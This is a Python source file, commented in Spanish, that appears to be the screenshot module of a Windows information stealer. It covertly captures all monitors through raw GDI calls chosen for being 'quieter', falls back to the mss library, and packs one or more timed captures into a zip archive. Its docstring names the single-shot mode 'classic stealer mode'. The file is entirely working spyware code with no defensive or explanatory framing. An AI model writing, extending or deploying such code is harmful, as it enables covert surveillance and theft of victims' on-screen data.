# language: Python 3, file: screenshot.py, target: Windows 10/11
# Captura screenshots via GDI (sin dependencias externas como PIL/mss)
# método 1: GDI BitBlt directo — más silencioso que PIL
# método 2: fallback a mss si está disponible
# guarda en zip: screenshot_initial.png + screenshot_N.png cada intervalo

import ctypes
import ctypes.wintypes
import os
import struct
import time
import threading
import zipfile
from io import BytesIO
from datetime import datetime

# ─────────────────────────────────────────────
# GDI SCREENSHOT — sin PIL, puro WinAPI
# ─────────────────────────────────────────────

BI_RGB       = 0
DIB_RGB_COLORS = 0

class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ("biSize",          ctypes.c_uint32),
        ("biWidth",         ctypes.c_int32),
        ("biHeight",        ctypes.c_int32),
        ("biPlanes",        ctypes.c_uint16),
        ("biBitCount",      ctypes.c_uint16),
        ("biCompression",   ctypes.c_uint32),
        ("biSizeImage",     ctypes.c_uint32),
        ("biXPelsPerMeter", ctypes.c_int32),
        ("biYPelsPerMeter", ctypes.c_int32),
        ("biClrUsed",       ctypes.c_uint32),
        ("biClrImportant",  ctypes.c_uint32),
    ]

class BITMAPINFO(ctypes.Structure):
    _fields_ = [
        ("bmiHeader", BITMAPINFOHEADER),
        ("bmiColors", ctypes.c_uint32 * 3),
    ]


def _screenshot_gdi() -> bytes | None:
    """
    Captura pantalla completa via GDI BitBlt.
    Retorna bytes de imagen BMP raw.
    Sin PIL, sin mss, solo kernel32/gdi32/user32.
    """
    try:
        user32 = ctypes.windll.user32
        gdi32  = ctypes.windll.gdi32
        k32    = ctypes.windll.kernel32

        # dimensiones de la pantalla virtual (todos los monitores)
        SM_XVIRTUALSCREEN  = 76
        SM_YVIRTUALSCREEN  = 77
        SM_CXVIRTUALSCREEN = 78
        SM_CYVIRTUALSCREEN = 79

        x = user32.GetSystemMetrics(SM_XVIRTUALSCREEN)
        y = user32.GetSystemMetrics(SM_YVIRTUALSCREEN)
        w = user32.GetSystemMetrics(SM_CXVIRTUALSCREEN)
        h = user32.GetSystemMetrics(SM_CYVIRTUALSCREEN)

        if w <= 0 or h <= 0:
            # fallback a pantalla primaria
            w = user32.GetSystemMetrics(0)
            h = user32.GetSystemMetrics(1)
            x = y = 0

        # contextos DC
        hdc_screen = user32.GetDC(None)
        hdc_mem    = gdi32.CreateCompatibleDC(hdc_screen)

        # bitmap compatible
        hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, w, h)
        old  = gdi32.SelectObject(hdc_mem, hbmp)

        # SRCCOPY = 0x00CC0020
        gdi32.BitBlt(hdc_mem, 0, 0, w, h, hdc_screen, x, y, 0x00CC0020)

        # extraer pixels via GetDIBits
        bmi = BITMAPINFO()
        bmi.bmiHeader.biSize        = ctypes.sizeof(BITMAPINFOHEADER)
        bmi.bmiHeader.biWidth       = w
        bmi.bmiHeader.biHeight      = -h   # negativo = top-down
        bmi.bmiHeader.biPlanes      = 1
        bmi.bmiHeader.biBitCount    = 32
        bmi.bmiHeader.biCompression = BI_RGB

        buf_size = w * h * 4
        buf = (ctypes.c_char * buf_size)()
        gdi32.GetDIBits(hdc_mem, hbmp, 0, h, buf, ctypes.byref(bmi), DIB_RGB_COLORS)

        # construir BMP desde raw BGRA
        raw_pixels = bytes(buf)
        bmp = _raw_to_bmp(raw_pixels, w, h)

        # limpiar
        gdi32.SelectObject(hdc_mem, old)
        gdi32.DeleteObject(hbmp)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(None, hdc_screen)

        return bmp

    except Exception:
        return None


def _raw_to_bmp(raw_bgra: bytes, w: int, h: int) -> bytes:
    """Convierte raw BGRA a formato BMP válido."""
    # BMP header (14 bytes) + DIB header (40 bytes) + pixel data
    pixel_data_offset = 54
    file_size = pixel_data_offset + len(raw_bgra)

    bmp_header = struct.pack(
        '<2sIHHI',
        b'BM',         # signature
        file_size,     # file size
        0,             # reserved
        0,             # reserved
        pixel_data_offset  # pixel data offset
    )

    dib_header = struct.pack(
        '<IiiHHIIiiII',
        40,            # header size
        w,             # width
        -h,            # height (negativo = top-down)
        1,             # planes
        32,            # bits per pixel
        0,             # compression (BI_RGB)
        len(raw_bgra), # image size
        0, 0,          # pixels per meter X/Y
        0,             # colors in table
        0              # important colors
    )

    return bmp_header + dib_header + raw_bgra


def _screenshot_mss_fallback() -> bytes | None:
    """Fallback a mss si está instalado."""
    try:
        import mss
        import mss.tools
        with mss.mss() as sct:
            monitor = sct.monitors[0]  # todos los monitores
            img = sct.grab(monitor)
            buf = BytesIO()
            mss.tools.to_png(img.rgb, img.size, output=buf)
            return buf.getvalue()
    except Exception:
        return None


def _take_screenshot() -> bytes | None:
    """Intenta GDI primero, fallback a mss."""
    data = _screenshot_gdi()
    if data:
        return data
    return _screenshot_mss_fallback()


# ─────────────────────────────────────────────
# CAPTURA CON INTERVALO
# ─────────────────────────────────────────────

def Screenshot(
    zip_file,
    interval_seconds: int = 0,
    max_count: int        = 1,
    folder: str           = "Screenshots"
) -> int:
    """
    Captura screenshots y los guarda en zip_file.

    interval_seconds=0  → solo captura inicial (modo stealer clásico)
    interval_seconds>0  → captura inicial + N más cada interval_seconds
                          corre en hilo separado, no bloquea el main thread

    max_count: cantidad total de screenshots (inicial + intervalos)
    folder: carpeta dentro del zip

    Retorna cantidad de screenshots capturadas.
    """
    count = 0

    def _capture_and_store(label: str) -> bool:
        nonlocal count
        data = _take_screenshot()
        if not data:
            return False
        ts  = datetime.utcnow().strftime("%H%M%S")
        ext = ".png" if data[:4] == b'\x89PNG' else ".bmp"
        arc = f"{folder}/{label}_{ts}{ext}"
        try:
            zip_file.writestr(arc, data)
            count += 1
            return True
        except Exception:
            return False

    # captura inicial — siempre
    _capture_and_store("screenshot_initial")

    if interval_seconds <= 0 or max_count <= 1:
        return count

    # capturas periódicas en hilo separado
    def _loop():
        for i in range(1, max_count):
            time.sleep(interval_seconds)
            _capture_and_store(f"screenshot_{i:03d}")

    t = threading.Thread(target=_loop, daemon=True)
    t.start()

    # espera a que terminen todos (timeout: interval * max_count + 5s)
    timeout = interval_seconds * (max_count - 1) + 5
    t.join(timeout=timeout)

    return count
